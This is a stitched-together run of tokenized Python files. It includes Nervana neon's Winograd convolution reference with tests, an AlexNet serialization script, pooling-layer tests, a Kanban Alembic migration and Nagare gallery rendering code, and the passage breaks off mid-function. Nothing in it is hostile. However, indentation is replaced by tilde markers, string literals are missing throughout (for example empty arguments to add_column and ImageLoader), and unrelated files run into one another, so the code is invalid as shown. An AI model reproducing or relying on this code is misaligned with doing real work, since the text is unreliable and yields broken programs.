# t1 = -rcp6  * I[0,:] - t0 \n 
# t2 =  rcp24 * I[0,:] + t0 \n 
\n 
# O[0,:] = rcp4 * I[0,:] \n 
# O[1,:] = t1 - rcp6  * I[1,:] \n 
# O[2,:] = t1 + rcp6  * I[1,:] \n 
# O[3,:] = t2 + rcp12 * I[1,:] \n 
# O[4,:] = t2 - rcp12 * I[1,:] \n 
# O[5,:] = I[2,:] \n 
\n 
~~~ t0 = I [ 0 , : ] + I [ 2 , : ] \n 
t1 = I [ 0 , : ] + I [ 2 , : ] * 4.0 \n 
\n 
O [ 0 , : ] = I [ 0 , : ] \n 
O [ 1 , : ] = t0 + I [ 1 , : ] \n 
O [ 2 , : ] = t0 - I [ 1 , : ] \n 
O [ 3 , : ] = t1 + I [ 1 , : ] * 2.0 \n 
O [ 4 , : ] = t1 - I [ 1 , : ] * 2.0 \n 
O [ 5 , : ] = I [ 2 , : ] \n 
\n 
~~ Fw [ : ] = T1 . T \n 
\n 
~~ else : \n 
~~~ Fw [ : ] = np . dot ( np . dot ( F_4x4_3x3 [ trans [ 0 ] ] , F ) , F_4x4_3x3 [ trans [ 1 ] ] . T ) \n 
\n 
~~ ~~ def trans_O_4x4_3x3 ( Mw , minimal = False , trans = False ) : \n 
~~~ if minimal : \n 
\n 
~~~ T0 = np . empty ( ( 4 , 6 ) ) \n 
T1 = np . empty ( ( 4 , 4 ) ) \n 
\n 
for O , I in ( ( T0 , Mw ) , ( T1 , T0 . T ) ) : \n 
\n 
~~~ t0 = I [ 1 , : ] + I [ 2 , : ] \n 
t1 = I [ 3 , : ] + I [ 4 , : ] \n 
t2 = I [ 1 , : ] - I [ 2 , : ] \n 
t3 = I [ 3 , : ] - I [ 4 , : ] \n 
\n 
O [ 0 , : ] = t0 + t1 + I [ 0 , : ] \n 
O [ 1 , : ] = t2 + t3 * 2.0 \n 
O [ 2 , : ] = t0 + t1 * 4.0 \n 
O [ 3 , : ] = t2 + t3 * 8.0 + I [ 5 , : ] \n 
\n 
~~ return T1 . T \n 
\n 
~~ else : \n 
~~~ return np . dot ( np . dot ( O_4x4_3x3 [ trans [ 0 ] ] , Mw ) , O_4x4_3x3 [ trans [ 1 ] ] . T ) \n 
\n 
\n 
~~ ~~ def trans_F_3x3_4x4 ( Fw , F , minimal = False , trans = False ) : \n 
~~~ if minimal : \n 
\n 
~~~ T0 = np . empty ( ( 6 , 4 ) ) \n 
T1 = np . empty ( ( 6 , 6 ) ) \n 
\n 
for O , I in ( ( T0 , F ) , ( T1 , T0 . T ) ) : \n 
\n 
~~~ t0 = I [ 0 , : ] + I [ 2 , : ] \n 
t1 = I [ 0 , : ] + I [ 2 , : ] * 4.0 \n 
t2 = I [ 1 , : ] + I [ 3 , : ] \n 
t3 = I [ 1 , : ] + I [ 3 , : ] * 4.0 \n 
\n 
O [ 0 , : ] = I [ 0 , : ] \n 
O [ 1 , : ] = t0 + t2 \n 
O [ 2 , : ] = t0 - t2 \n 
O [ 3 , : ] = t1 + t3 * 2.0 \n 
O [ 4 , : ] = t1 - t3 * 2.0 \n 
O [ 5 , : ] = I [ 3 , : ] \n 
\n 
# t0 = (I[0,:] + I[2,:])*-rcp6 \n 
# t1 = (I[0,:]*rcp4 + I[2,:])*rcp6 \n 
# t2 = (I[1,:] + I[3,:])*rcp6 \n 
# t3 = (I[1,:]*rcp4 + I[3,:])*rcp3 \n 
\n 
# O[0,:] = I[0,:]*rcp4 \n 
# O[1,:] = t0 - t2 \n 
# O[2,:] = t0 + t2 \n 
# O[3,:] = t1 + t3 \n 
# O[4,:] = t1 - t3 \n 
# O[5,:] = I[3,:] \n 
\n 
~~ Fw [ : ] = T1 . T \n 
\n 
~~ else : \n 
~~~ Fw [ : ] = np . dot ( np . dot ( O_4x4_3x3 [ trans [ 0 ] ] . T , F ) , O_4x4_3x3 [ trans [ 1 ] ] ) \n 
\n 
~~ ~~ def trans_O_3x3_4x4 ( Mw , minimal = False , trans = False ) : \n 
~~~ if minimal : \n 
\n 
~~~ T0 = np . empty ( ( 3 , 6 ) ) \n 
T1 = np . empty ( ( 3 , 3 ) ) \n 
\n 
for O , I in ( ( T0 , Mw ) , ( T1 , T0 . T ) ) : \n 
\n 
# t0 = rcp6 * I[1,:] \n 
# t1 = rcp6 * I[2,:] \n 
# t2 = rcp6 * (I[3,:] + I[4,:]) \n 
# t3 = t0 + t1 \n 
\n 
# O[0,:] = rcp4 * (I[0,:] + t2) - t3 \n 
# O[1,:] = t1 - t0 + rcp12 * (I[3,:] - I[4,:]) \n 
# O[2,:] = t2 - t3 + I[5,:] \n 
\n 
# t0 = -rcp6 * (I[1,:] + I[2,:]) \n 
# t1 =  rcp6 * (I[3,:] + I[4,:]) \n 
\n 
# O[0,:] = rcp4 * (I[0,:] + t1) + t0 \n 
# O[1,:] = rcp6 * (I[2,:] - I[1,:]) + rcp12 * (I[3,:] - I[4,:]) \n 
# O[2,:] = t0 + t1 + I[5,:] \n 
\n 
~~~ t0 = I [ 1 , : ] + I [ 2 , : ] \n 
t1 = I [ 3 , : ] + I [ 4 , : ] \n 
\n 
O [ 0 , : ] = I [ 0 , : ] + t0 + t1 \n 
O [ 1 , : ] = I [ 1 , : ] - I [ 2 , : ] + 2 * ( I [ 3 , : ] - I [ 4 , : ] ) \n 
O [ 2 , : ] = t0 + 4 * t1 + I [ 5 , : ] \n 
\n 
~~ return T1 . T \n 
\n 
~~ else : \n 
~~~ return np . dot ( np . dot ( F_4x4_3x3 [ trans [ 0 ] ] . T , Mw ) , F_4x4_3x3 [ trans [ 1 ] ] ) \n 
\n 
~~ ~~ def image_slice ( x , X , B , D , pad = 0 ) : \n 
~~~ start = x * B - pad \n 
stop = start + D \n 
pad = [ 0 , 0 ] \n 
if start < 0 : \n 
~~~ pad [ 0 ] = - start \n 
start = 0 \n 
~~ if stop - 1 >= X : \n 
~~~ pad [ 1 ] = stop - X \n 
~~ return start , stop , pad \n 
\n 
~~ def output_slice ( p , P , B ) : \n 
~~~ p0 = p * B \n 
p1 = p0 + B \n 
if p1 > P : \n 
~~~ p1 = P \n 
~~ return p0 , p1 , p1 - p0 \n 
\n 
~~ def xprop_winograd ( I , F , O , padding , minimal = False , trans = False , backward = False ) : \n 
\n 
~~~ if backward : \n 
# C <=> K and mirror R,S \n 
~~~ F = np . transpose ( F [ : , : : - 1 , : : - 1 , : ] , ( 3 , 1 , 2 , 0 ) ) . copy ( ) \n 
# Invert padding \n 
padding = [ 2 - p for p in padding ] \n 
\n 
~~ C , Y , X , N = I . shape \n 
K , P , Q , N = O . shape \n 
\n 
B = 4 \n 
D = B + 2 \n 
Yw = ceil_div ( P , B ) \n 
Xw = ceil_div ( Q , B ) \n 
\n 
Fw = np . empty ( ( D , D , C , K ) ) \n 
Iw = np . empty ( ( D , D , C , Yw , Xw , N ) ) \n 
Mw = np . empty ( ( D , D , K , Yw , Xw , N ) ) #, dtype=np.int64 \n 
\n 
# Transform Filters \n 
for c in range ( C ) : \n 
~~~ for k in range ( K ) : \n 
~~~ trans_F_4x4_3x3 ( Fw [ : , : , c , k ] , F [ c , : , : , k ] , minimal , trans ) \n 
\n 
# Iterate over image transform dimensions and slice out tiles of the image \n 
~~ ~~ for y in range ( Yw ) : \n 
~~~ start_y , stop_y , pad_y = image_slice ( y , Y , B , D , padding [ 0 ] ) \n 
\n 
for x in range ( Xw ) : \n 
~~~ start_x , stop_x , pad_x = image_slice ( x , X , B , D , padding [ 1 ] ) \n 
\n 
sliceI = I [ : , start_y : stop_y , start_x : stop_x , : ] \n 
\n 
# add any zero padding if needed \n 
if any ( pad_y ) or any ( pad_x ) : \n 
~~~ sliceI = np . pad ( sliceI , ( ( 0 , 0 ) , pad_y , pad_x , ( 0 , 0 ) ) , ) \n 
\n 
# Apply the Image transform \n 
~~ for c in range ( C ) : \n 
~~~ for n in range ( N ) : \n 
~~~ trans_I_4x4_3x3 ( Iw [ : , : , c , y , x , n ] , sliceI [ c , : , : , n ] , minimal , trans ) \n 
\n 
# Fw, scaleF = quantize(Fw, 16) \n 
# Iw, scaleI = quantize(Iw, 16) \n 
\n 
# Fw = Fw.astype(np.float16).astype(np.float64) \n 
# Iw = Iw.astype(np.float16).astype(np.float64) \n 
\n 
# Batched gemm for the pointwise multiplication step \n 
~~ ~~ ~~ ~~ for s in range ( D ) : \n 
~~~ for t in range ( D ) : \n 
# [K,Yw,Xw,N] = [C,K].T . [C,YwXwN] \n 
~~~ Mw [ s , t ] = np . dot ( Fw [ s , t ] . T , Iw [ s , t ] . reshape ( C , - 1 ) ) . reshape ( ( K , Yw , Xw , N ) ) \n 
\n 
# print Mw[:,:,0,0,0,0] \n 
# exit() \n 
\n 
# Mw = Mw.astype(np.float64) * scaleF * scaleI \n 
\n 
# Iterate over the convovled result in the pointwise space and apply inverse transform \n 
~~ ~~ for y in range ( Yw ) : \n 
~~~ p0 , p1 , plen = output_slice ( y , P , B ) \n 
for x in range ( Xw ) : \n 
~~~ q0 , q1 , qlen = output_slice ( x , Q , B ) \n 
for k in range ( K ) : \n 
~~~ for n in range ( N ) : \n 
\n 
#print y, x, plen, qlen \n 
~~~ Out = trans_O_4x4_3x3 ( Mw [ : , : , k , y , x , n ] , minimal , trans ) \n 
#print Out \n 
#print Out[0:plen,0:qlen] \n 
O [ k , p0 : p1 , q0 : q1 , n ] = Out [ 0 : plen , 0 : qlen ] \n 
\n 
\n 
~~ ~~ ~~ ~~ ~~ def updat_winograd ( I , E , U , padding , minimal = False , trans = False , inner = True ) : \n 
\n 
~~~ C , Y , X , N = I . shape \n 
K , P , Q , N = E . shape \n 
\n 
B = 4 \n 
D = B + 2 \n 
Yw = ceil_div ( P , B ) \n 
Xw = ceil_div ( Q , B ) \n 
\n 
Iw = np . empty ( ( D , D , N , C ) ) \n 
Ew = np . empty ( ( D , D , N , K ) ) \n 
if inner : \n 
~~~ Mw = np . empty ( ( D , D , C , K ) ) \n 
U . fill ( 0.0 ) \n 
~~ else : \n 
~~~ Mw = np . zeros ( ( D , D , C , K ) ) \n 
\n 
~~ for y in range ( Yw ) : \n 
~~~ start_y , stop_y , pad_y = image_slice ( y , Y , B , D , padding [ 0 ] ) \n 
start_p , stop_p , pad_p = image_slice ( y , P , B , B ) \n 
\n 
for x in range ( Xw ) : \n 
~~~ start_x , stop_x , pad_x = image_slice ( x , X , B , D , padding [ 1 ] ) \n 
start_q , stop_q , pad_q = image_slice ( x , Q , B , B ) \n 
\n 
sliceI = I [ : , start_y : stop_y , start_x : stop_x , : ] \n 
sliceE = E [ : , start_p : stop_p , start_q : stop_q , : ] \n 
\n 
if any ( pad_y ) or any ( pad_x ) : \n 
~~~ sliceI = np . pad ( sliceI , ( ( 0 , 0 ) , pad_y , pad_x , ( 0 , 0 ) ) , ) \n 
\n 
~~ if any ( pad_p ) or any ( pad_q ) : \n 
~~~ sliceE = np . pad ( sliceE , ( ( 0 , 0 ) , pad_p , pad_q , ( 0 , 0 ) ) , ) \n 
\n 
~~ for c in range ( C ) : \n 
~~~ for n in range ( N ) : \n 
~~~ trans_I_4x4_3x3 ( Iw [ : , : , n , c ] , sliceI [ c , : , : , n ] , minimal , trans ) \n 
\n 
~~ ~~ for k in range ( K ) : \n 
~~~ for n in range ( N ) : \n 
~~~ trans_F_3x3_4x4 ( Ew [ : , : , n , k ] , sliceE [ k , : , : , n ] , minimal , trans ) \n 
\n 
# print Iw[:,:,0,0] \n 
# print Ew[:,:,0,0] \n 
# exit() \n 
\n 
# Ew = Ew.astype(np.float16).astype(np.float64) \n 
# Iw = Iw.astype(np.float16).astype(np.float64) \n 
\n 
~~ ~~ for s in range ( D ) : \n 
~~~ for t in range ( D ) : \n 
# [C,K] += [N,C].T . [N,K] \n 
~~~ if inner : \n 
~~~ Mw [ s , t ] = np . dot ( Iw [ s , t ] . T , Ew [ s , t ] ) \n 
~~ else : \n 
~~~ Mw [ s , t ] += np . dot ( Iw [ s , t ] . T , Ew [ s , t ] ) \n 
\n 
# Transform can be applied in inner or outer loop \n 
~~ ~~ ~~ if inner : \n 
~~~ for c in range ( C ) : \n 
~~~ for k in range ( K ) : \n 
~~~ U [ c , : , : , k ] += trans_O_3x3_4x4 ( Mw [ : , : , c , k ] , minimal , trans ) \n 
\n 
# outer loop transform \n 
~~ ~~ ~~ ~~ ~~ if not inner : \n 
~~~ for c in range ( C ) : \n 
~~~ for k in range ( K ) : \n 
~~~ U [ c , : , : , k ] = trans_O_3x3_4x4 ( Mw [ : , : , c , k ] , minimal , trans ) \n 
\n 
\n 
\n 
### Test Code ### \n 
\n 
~~ ~~ ~~ ~~ np . set_printoptions ( threshold = 8192 * 4 , linewidth = 600 , formatter = { : lambda x : "%6.3f" % x } ) \n 
\n 
minimal = 1 \n 
trans = ( 2 , 2 ) \n 
ones = 0 \n 
N = 32 \n 
C , K = 32 , 32 \n 
Y , X = 6 , 6 \n 
R , S = 3 , 3 # Fixed winograd dim \n 
strides = 1 , 1 # Fixed winograd dim \n 
padding = 0 , 0 # 0-2 \n 
\n 
P = out_dim ( R , Y , padding [ 0 ] , strides [ 0 ] ) \n 
Q = out_dim ( S , X , padding [ 1 ] , strides [ 1 ] ) \n 
\n 
print P , Q \n 
\n 
dimI = ( C , Y , X , N ) \n 
dimF = ( C , R , S , K ) \n 
dimO = ( K , P , Q , N ) \n 
\n 
if ones : \n 
~~~ I = np . zeros ( dimI ) \n 
F = np . ones ( dimF ) \n 
E = np . zeros ( dimO ) \n 
\n 
for p , q in np . ndindex ( ( Y , X ) ) : \n 
~~~ I [ : , p , q , : ] = np . identity ( N ) \n 
\n 
~~ for p , q in np . ndindex ( ( P , Q ) ) : \n 
~~~ for n in range ( N ) : \n 
~~~ E [ : , p , q , n ] = range ( K ) \n 
\n 
# for c in range(C): \n 
#     for n in range(N): \n 
#         I[c,:,:,n] = c+1 #np.arange(1+c,37+c).reshape((6,6)) \n 
\n 
# for k in range(K): \n 
#     for n in range(N): \n 
#         E[k,:,:,n] = k+1 #np.arange(1+k,17+k).reshape((4,4)) \n 
\n 
~~ ~~ ~~ else : \n 
~~~ I = np . random . uniform ( - 1.0 , 1.0 , dimI ) \n 
#F  = np.random.normal(0.0, 0.1, dimF) \n 
F = np . random . uniform ( - 1.0 , 1.0 , dimF ) \n 
E = np . random . uniform ( - 1.0 , 1.0 , dimO ) \n 
\n 
~~ Od = np . empty ( dimO ) \n 
Ow = np . empty ( dimO ) #, dtype=np.float32 \n 
\n 
Bd = np . empty ( dimI ) \n 
Bw = np . empty ( dimI ) #, dtype=np.float32 \n 
\n 
Ud = np . empty ( dimF ) \n 
Uw = np . empty ( dimF ) \n 
\n 
\n 
xprop_direct ( I , F , Od , padding , strides ) \n 
xprop_winograd ( I , F , Ow , padding , minimal = minimal , trans = trans ) \n 
\n 
xprop_direct ( E , F , Bd , padding , strides , backward = True ) \n 
xprop_winograd ( E , F , Bw , padding , minimal = minimal , trans = trans , backward = True ) \n 
\n 
updat_direct ( I , E , Ud , padding , strides ) \n 
updat_winograd ( I , E , Uw , padding , minimal = minimal , trans = trans ) \n 
\n 
difO = Od - Ow \n 
difB = Bd - Bw \n 
difU = Ud - Uw \n 
\n 
print abs ( difO ) . max ( ) / Od . max ( ) \n 
print abs ( difB ) . max ( ) / Bd . max ( ) \n 
print abs ( difU ) . max ( ) / Ud . max ( ) \n 
\n 
# print Bd[0,:,:,0] \n 
# print Bw[0,:,:,0] \n 
\n 
# print Ud[0,:,:,0] \n 
# print Uw[0,:,:,0] \n 
# print difU[0,:,:,0] \n 
# ---------------------------------------------------------------------------- \n 
# Copyright 2015 Nervana Systems Inc. \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#      http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
# ---------------------------------------------------------------------------- \n 
from neon . layers . layer import ( Linear , Bias , Affine , Conv , Convolution , GeneralizedCost , Dropout , \n 
Pooling , Activation , DataTransform , BatchNorm , BatchNormAutodiff , \n 
Deconv , Deconvolution , GeneralizedCostMask , LookupTable , \n 
BranchNode , SkipNode , LRN , ColorNoise ) \n 
from neon . layers . recurrent import ( Recurrent , LSTM , GRU , RecurrentSum , RecurrentMean , RecurrentLast , BiRNN , BiLSTM , DeepBiRNN , DeepBiLSTM ) \n 
from neon . layers . container import ( Tree , Sequential , MergeMultistream , MergeBroadcast , Multicost , \n 
RoiPooling , MergeSum , SingleOutputTree ) \n 
#!/usr/bin/env python \n 
# ---------------------------------------------------------------------------- \n 
# Copyright 2015 Nervana Systems Inc. \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#      http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
# ---------------------------------------------------------------------------- \n 
"""\nalexnet model adapted for serialization testing\n\nhas subset_pct set so that there are a low number of iterations per epoch\nand no partial minibatches, dropout is turned off for reproducibility on gpu\nand the learning rate is scaled to handle the reduced dropout percentage.\n\n""" \n 
\n 
from neon . util . argparser import NeonArgparser \n 
from neon . initializers import Constant , Gaussian \n 
from neon . layers import Conv , Dropout , Pooling , GeneralizedCost , Affine \n 
from neon . optimizers import GradientDescentMomentum , MultiOptimizer , Schedule \n 
from neon . transforms import Rectlin , Softmax , CrossEntropyMulti , TopKMisclassification \n 
from neon . models import Model \n 
from neon . data import ImageLoader \n 
from neon . callbacks . callbacks import Callbacks \n 
\n 
# parse the command line arguments (generates the backend) \n 
parser = NeonArgparser ( __doc__ ) \n 
args = parser . parse_args ( ) \n 
\n 
# setup data provider \n 
img_set_options = dict ( repo_dir = args . data_dir , \n 
inner_size = 224 , \n 
subset_pct = 0.09990891117239205 ) \n 
train = ImageLoader ( set_name = , scale_range = ( 256 , 256 ) , shuffle = False , \n 
do_transforms = False , ** img_set_options ) \n 
test = ImageLoader ( set_name = , scale_range = ( 256 , 384 ) , shuffle = False , \n 
do_transforms = False , ** img_set_options ) \n 
\n 
layers = [ Conv ( ( 11 , 11 , 64 ) , init = Gaussian ( scale = 0.01 ) , bias = Constant ( 0 ) , \n 
activation = Rectlin ( ) , padding = 3 , strides = 4 ) , \n 
Pooling ( 3 , strides = 2 ) , \n 
Conv ( ( 5 , 5 , 192 ) , init = Gaussian ( scale = 0.01 ) , bias = Constant ( 1 ) , \n 
activation = Rectlin ( ) , padding = 2 ) , \n 
Pooling ( 3 , strides = 2 ) , \n 
Conv ( ( 3 , 3 , 384 ) , init = Gaussian ( scale = 0.03 ) , bias = Constant ( 0 ) , \n 
activation = Rectlin ( ) , padding = 1 ) , \n 
Conv ( ( 3 , 3 , 256 ) , init = Gaussian ( scale = 0.03 ) , bias = Constant ( 1 ) , \n 
activation = Rectlin ( ) , padding = 1 ) , \n 
Conv ( ( 3 , 3 , 256 ) , init = Gaussian ( scale = 0.03 ) , bias = Constant ( 1 ) , \n 
activation = Rectlin ( ) , padding = 1 ) , \n 
Pooling ( 3 , strides = 2 ) , \n 
Affine ( nout = 4096 , init = Gaussian ( scale = 0.01 ) , bias = Constant ( 1 ) , activation = Rectlin ( ) ) , \n 
Dropout ( keep = 1.0 ) , \n 
Affine ( nout = 4096 , init = Gaussian ( scale = 0.01 ) , bias = Constant ( 1 ) , activation = Rectlin ( ) ) , \n 
Dropout ( keep = 1.0 ) , \n 
Affine ( nout = 1000 , init = Gaussian ( scale = 0.01 ) , bias = Constant ( - 7 ) , activation = Softmax ( ) ) ] \n 
model = Model ( layers = layers ) \n 
\n 
# drop weights LR by 1/250**(1/3) at epochs (23, 45, 66), drop bias LR by 1/10 at epoch 45 \n 
weight_sched = Schedule ( [ 22 , 44 , 65 ] , ( 1 / 250. ) ** ( 1 / 3. ) ) \n 
opt_gdm = GradientDescentMomentum ( 0.01 / 10 , 0.9 , wdecay = 0.0005 , schedule = weight_sched , \n 
stochastic_round = args . rounding ) \n 
opt_biases = GradientDescentMomentum ( 0.02 / 10 , 0.9 , schedule = Schedule ( [ 44 ] , 0.1 ) , \n 
stochastic_round = args . rounding ) \n 
opt = MultiOptimizer ( { : opt_gdm , : opt_biases } ) \n 
\n 
# configure callbacks \n 
valmetric = TopKMisclassification ( k = 5 ) \n 
callbacks = Callbacks ( model , eval_set = test , metric = valmetric , ** args . callback_args ) \n 
cost = GeneralizedCost ( costfunc = CrossEntropyMulti ( ) ) \n 
model . fit ( train , optimizer = opt , num_epochs = args . epochs , cost = cost , callbacks = callbacks ) \n 
# ---------------------------------------------------------------------------- \n 
# Copyright 2015 Nervana Systems Inc. \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#      http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
# ---------------------------------------------------------------------------- \n 
"""\nPooling layer tests\n""" \n 
import itertools as itt \n 
import numpy as np \n 
from neon import NervanaObject \n 
from neon . layers . layer import Pooling \n 
from tests . utils import allclose_with_out \n 
\n 
\n 
def pytest_generate_tests ( metafunc ) : \n 
~~~ np . random . seed ( 1 ) \n 
if metafunc . config . option . all : \n 
~~~ bsz_rng = [ 32 , 64 ] \n 
~~ else : \n 
~~~ bsz_rng = [ 128 ] \n 
\n 
~~ if in metafunc . fixturenames : \n 
# to check padding, do not need large input \n 
~~~ fargs = [ ] \n 
if metafunc . config . option . all : \n 
~~~ fs_rng = [ 2 , 3 , 5 ] \n 
pad_rng = [ 0 , 1 ] \n 
nifm_rng = [ 16 , 32 ] \n 
in_sz_rng = [ 8 , 16 ] \n 
~~ else : \n 
~~~ fs_rng = [ 2 , 4 ] \n 
pad_rng = [ 0 , 1 ] \n 
nifm_rng = [ 8 ] \n 
in_sz_rng = [ 8 ] \n 
~~ fargs_ = [ ] \n 
for fs in fs_rng : \n 
~~~ stride_rng = set ( [ 1 , fs / 2 , fs ] ) \n 
fargs_ . append ( itt . product ( fs_rng , nifm_rng , pad_rng , stride_rng , in_sz_rng , bsz_rng ) ) \n 
~~ fargs = itt . chain ( * fargs_ ) \n 
metafunc . parametrize ( , fargs ) \n 
\n 
\n 
~~ ~~ def ref_pooling ( inp , inp_shape , fshape , padding , strides , be , ncheck = None ) : \n 
# given input tensor return the expected polling output for \n 
# certain batches \n 
~~~ inp_lshape = list ( inp_shape ) \n 
bsz = inp . shape [ - 1 ] \n 
if ncheck is None : \n 
~~~ check_inds = np . arange ( bsz ) \n 
~~ elif type ( ncheck ) is int : \n 
~~~ check_inds = np . random . permutation ( bsz ) \n 
check_inds = check_inds [ 0 : ncheck ] \n 
~~ else : \n 
~~~ check_inds = ncheck \n 
~~ check_inds = np . sort ( check_inds ) \n 
\n 
inp_lshape . append ( bsz ) \n 
inpa = inp . get ( ) . reshape ( inp_lshape ) \n 
outshape = ( inp_lshape [ 0 ] , \n 
be . output_dim ( inp_lshape [ 1 ] , fshape [ 0 ] , padding , strides [ 0 ] , pooling = True ) , \n 
be . output_dim ( inp_lshape [ 2 ] , fshape [ 1 ] , padding , strides [ 1 ] , pooling = True ) , \n 
len ( check_inds ) ) \n 
\n 
if padding > 0 : \n 
~~~ padded_shape = ( inp_lshape [ 0 ] , \n 
inp_lshape [ 1 ] + 2 * padding , \n 
inp_lshape [ 2 ] + 2 * padding , \n 
inp_lshape [ - 1 ] ) \n 
inp_pad = np . zeros ( padded_shape ) \n 
inp_pad [ : , padding : - padding , padding : - padding , : ] = inpa [ : , 0 : , 0 : , : ] \n 
~~ else : \n 
~~~ inp_pad = inpa \n 
\n 
~~ out_exp = np . zeros ( outshape ) \n 
for indC in range ( outshape [ 0 ] ) : \n 
~~~ for indh in range ( outshape [ 1 ] ) : \n 
~~~ hrng = ( indh * strides [ 0 ] , indh * strides [ 0 ] + fshape [ 0 ] ) \n 
for indw in range ( outshape [ 2 ] ) : \n 
~~~ wrng = ( indw * strides [ 1 ] , indw * strides [ 1 ] + fshape [ 1 ] ) \n 
for cnt , indb in enumerate ( check_inds ) : \n 
~~~ inp_check = inp_pad [ indC , hrng [ 0 ] : hrng [ 1 ] , wrng [ 0 ] : wrng [ 1 ] , indb ] \n 
out_exp [ indC , indh , indw , cnt ] = np . max ( inp_check ) \n 
~~ ~~ ~~ ~~ return ( out_exp , check_inds ) \n 
\n 
\n 
~~ def test_padding ( backend_default , poolargs ) : \n 
~~~ fshape , nifm , padding , stride , in_sz , batch_size = poolargs \n 
\n 
NervanaObject . be . bsz = batch_size \n 
\n 
# basic sanity check with random inputs \n 
inshape = ( nifm , in_sz , in_sz ) \n 
insize = np . prod ( inshape ) \n 
neon_layer = Pooling ( fshape = fshape , strides = stride , padding = padding ) \n 
\n 
inp = neon_layer . be . array ( np . random . random ( ( insize , batch_size ) ) ) \n 
inp . lshape = inshape \n 
neon_layer . configure ( inshape ) \n 
neon_layer . prev_layer = True \n 
neon_layer . allocate ( ) \n 
neon_layer . set_deltas ( [ neon_layer . be . iobuf ( inshape ) ] ) \n 
\n 
out = neon_layer . fprop ( inp ) . get ( ) \n 
\n 
ncheck = [ 0 , batch_size / 2 , batch_size - 1 ] \n 
\n 
( out_exp , check_inds ) = ref_pooling ( inp , inp . lshape , \n 
( fshape , fshape ) , \n 
padding , \n 
( stride , stride ) , \n 
neon_layer . be , \n 
ncheck = ncheck ) \n 
\n 
out_shape = list ( out_exp . shape [ 0 : 3 ] ) \n 
out_shape . append ( batch_size ) \n 
outa = out . reshape ( out_shape ) \n 
\n 
assert allclose_with_out ( out_exp , outa [ : , : , : , check_inds ] , atol = 0.0 , rtol = 0.0 ) \n 
#-- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
#-- \n 
\n 
~~ """adding max cards\n\nRevision ID: b740362087\nRevises: 537fa16b46e7\nCreate Date: 2013-09-19 17:37:37.027495\n\n""" \n 
\n 
# revision identifiers, used by Alembic. \n 
revision = \n 
down_revision = \n 
\n 
from alembic import op \n 
import sqlalchemy as sa \n 
\n 
\n 
def upgrade ( ) : \n 
~~~ op . add_column ( , sa . Column ( , sa . Integer ) ) \n 
\n 
\n 
~~ def downgrade ( ) : \n 
~~~ op . drop_column ( , ) \n 
#-- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
#-- \n 
\n 
~~ from . import view \n 
from . comp import Card , NewCard \n 
# -- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
# -- \n 
\n 
from nagare . i18n import _ \n 
from nagare import presentation , ajax , security , component \n 
\n 
from . comp import Gallery , Asset , AssetCropper \n 
\n 
\n 
def render_image ( self , h , comp , size , randomize = False , ** kw ) : \n 
~~~ metadata = self . assets_manager . get_metadata ( self . filename ) \n 
src = self . assets_manager . get_image_url ( self . filename , size ) \n 
if randomize : \n 
~~~ src += + h . generate_id ( ) \n 
~~ return h . img ( title = metadata [ ] , alt = metadata [ ] , \n 
src = src , ** kw ) \n 
\n 
\n 
~~ def render_file ( self , h , comp , size , ** kw ) : \n 
~~~ kw [ ] += \n 
metadata = self . assets_manager . get_metadata ( self . filename ) \n 
res = [ h . img ( title = metadata [ ] , alt = metadata [ ] , \n 
src = "img/file-icon.jpg" , ** kw ) ] \n 
if size == : \n 
~~~ res . append ( h . span ( metadata [ ] ) ) \n 
~~ return res \n 
\n 
~~ CONTENT_TYPES = { : render_image , \n 
: render_image , \n 
: render_image , \n 
: render_image } \n 
\n 
\n 
@ presentation . render_for ( Gallery ) \n 
def render ( self , h , comp , * args ) : \n 
~~~ with h . div ( id = + self . comp_id ) : \n 
~~~ with h . div ( class_ = ) : \n 
~~~ h << comp . render ( h , model = ) \n 
~~ with h . div ( id = "card-gallery" ) : \n 
~~~ h << comp . render ( h , self . model ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , ) \n 
def render_Gallery_view ( self , h , comp , model ) : \n 
~~~ model = if security . has_permissions ( , self ) else \n 
for asset in self . assets : \n 
~~~ h << asset . render ( h , model ) \n 
~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , ) \n 
def render_Gallery_crop ( self , h , comp , model ) : \n 
~~~ return self . cropper . on_answer ( self . action ) \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , ) \n 
def render_cover ( self , h , comp , model ) : \n 
~~~ cover = self . get_cover ( ) \n 
if cover : \n 
~~~ h << h . p ( component . Component ( self . get_cover ( ) , model = ) , class_ = ) \n 
~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , "action" ) \n 
def render_download ( self , h , comp , * args ) : \n 
~~~ if security . has_permissions ( , self ) : \n 
